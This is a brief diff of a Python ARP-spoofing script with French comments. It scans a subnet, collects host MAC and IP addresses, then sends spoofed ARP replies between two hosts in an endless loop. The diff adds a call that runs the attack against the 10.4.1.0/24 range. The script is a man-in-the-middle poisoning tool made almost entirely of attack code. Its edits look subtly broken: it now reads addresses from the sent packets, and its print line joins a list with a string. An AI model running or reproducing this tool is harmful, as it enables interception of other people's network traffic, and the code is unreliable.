@@ -19,8 +19,8 @@ def ARP_Spoof(Network = str):
     print ("\n[*] IP - MAC") 
 
     for i in range(len(ans)): # Stock des adresses MAC et IP
-        MAC.append(ans[i][1].hwsrc)
-        IP.append(ans[i][1].psrc)
+        MAC.append(ans[i][0].hwsrc)
+        IP.append(ans[i][0].psrc)
 
     print("\n[*] Scan fini" + "\n[*] Résultat :" + "\n ADRESSES MAC :", MAC + "\n ADRESSES IP :", IP )
 
@@ -33,3 +33,4 @@ def ARP_Spoof(Network = str):
     while True: # Redistribution des requêtes ARP 
             spoof(IP[1], IP[2])
             spoof(IP[2], IP[1])
+print(ARP_Spoof("10.4.1.0/24"))
